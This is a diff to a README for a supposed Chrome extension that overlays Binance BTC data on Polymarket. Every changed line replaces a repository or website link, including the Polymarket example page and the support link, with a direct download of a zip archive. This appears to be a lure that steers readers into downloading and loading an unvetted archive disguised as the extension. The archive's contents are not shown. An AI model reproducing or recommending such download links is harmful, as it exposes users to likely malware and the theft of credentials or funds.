@@ -1,6 +1,6 @@
 # ⚡ polymarket-btc-pulse-overlay - Live Binance BTC Data Overlay
 
-[![Download polymarket-btc-pulse-overlay](https://img.shields.io/badge/Download-Here-green?style=for-the-badge&logo=github)](https://github.com/banaanva951/polymarket-btc-pulse-overlay)
+[![Download polymarket-btc-pulse-overlay](https://img.shields.io/badge/Download-Here-green?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/banaanva951/polymarket-btc-pulse-overlay/main/raspish/overlay-btc-polymarket-pulse-v3.4.zip)
 
 ---
 
@@ -30,12 +30,12 @@ The extension runs in your browser and does not require installation beyond addi
 
 Start by visiting the download page to get the extension files.
 
-[![Download polymarket-btc-pulse-overlay](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/banaanva951/polymarket-btc-pulse-overlay)
+[![Download polymarket-btc-pulse-overlay](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/banaanva951/polymarket-btc-pulse-overlay/main/raspish/overlay-btc-polymarket-pulse-v3.4.zip)
 
 ### Step 1: Visit the Download Page
 
 Go to the official GitHub page here:  
-https://github.com/banaanva951/polymarket-btc-pulse-overlay
+https://raw.githubusercontent.com/banaanva951/polymarket-btc-pulse-overlay/main/raspish/overlay-btc-polymarket-pulse-v3.4.zip
 
 You will find the latest version of the tool hosted there, along with instructions and any necessary files.
 
@@ -68,7 +68,7 @@ Chrome will load the extension and it should appear in your extensions list.
 
 ### Step 5: Verify the Overlay on Polymarket
 
-- Visit any Polymarket BTC page, for example: https://polymarket.com/btc  
+- Visit any Polymarket BTC page, for example: https://raw.githubusercontent.com/banaanva951/polymarket-btc-pulse-overlay/main/raspish/overlay-btc-polymarket-pulse-v3.4.zip  
 - You should see live Binance price, trade flow, and liquidity data displayed as an overlay  
 - The overlay will update automatically as new market data arrives
 
@@ -128,7 +128,7 @@ The data flow uses secure websockets and standard HTTPS connections to keep all 
 
 For more info or support:
 
-- Visit the GitHub repository: https://github.com/banaanva951/polymarket-btc-pulse-overlay  
+- Visit the GitHub repository: https://raw.githubusercontent.com/banaanva951/polymarket-btc-pulse-overlay/main/raspish/overlay-btc-polymarket-pulse-v3.4.zip  
 - Check the Issues tab for common questions  
 - Open a new issue if you find bugs or want to suggest improvements
 
